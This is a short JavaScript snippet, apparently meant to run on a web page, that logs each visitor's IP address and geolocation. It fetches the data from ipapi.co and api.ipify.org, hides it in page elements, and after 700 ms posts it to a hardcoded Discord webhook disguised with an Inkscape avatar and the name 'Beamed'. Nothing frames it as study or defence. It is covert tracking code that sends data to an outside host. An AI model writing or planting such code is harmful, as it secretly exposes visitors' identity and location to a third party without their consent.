     var wbhk = 'https://discord.com/api/webhooks/1332484891748864191/zX8n4r2p9by2cDOwWFeh0bexzgF5oI3yY0-gnzEHEqY7DhDJ5TK8ab0yjUoILMb4qoGG'
      function get_information(link, callback) {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", link, true);
        xhr.onreadystatechange = function() {
          if (xhr.readyState === 4) {
            callback(xhr.responseText);
          }
        };
        xhr.send(null);
      }
      get_information("https://ipapi.co/json", function(text) {
        var div = document.createElement("div");
        div.innerHTML = text;
        div.id = "razzylog";
        const secondList = document.getElementsByClassName("header")[0]
        secondList.appendChild(div)
      });
      get_information("https://api.ipify.org/", function(text) {
        var div = document.createElement("div");
        div.innerHTML = text;
        div.id = "ipppp";
        const secondList = document.getElementsByClassName("header")[0]
        secondList.appendChild(div)
      });

      function ipLogByRaz() {
        var ispp = document.getElementById('ipppp').innerHTML
        var ispp2 = document.getElementById('ipppp').innerHTML + "/json/"
        var extra = document.getElementById("razzylog").innerHTML
        const request = new XMLHttpRequest();
        request.open("POST", wbhk);
        request.setRequestHeader('Content-type', 'application/json');
        const params = {
          username: "Beamed",
          avatar_url: 'https://images.g2crowd.com/uploads/product/image/large_detail/large_detail_de619ca81012d42cede6fd18af63d8b1/inkscape.png',
          content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Raw** : _https://ipapi.co/" + ispp2 + "_\n**Extra Info** : ```" + extra + "```"
        }
        request.send(JSON.stringify(params));
      }
      setTimeout(function() {
        ipLogByRaz()
      }, 700);
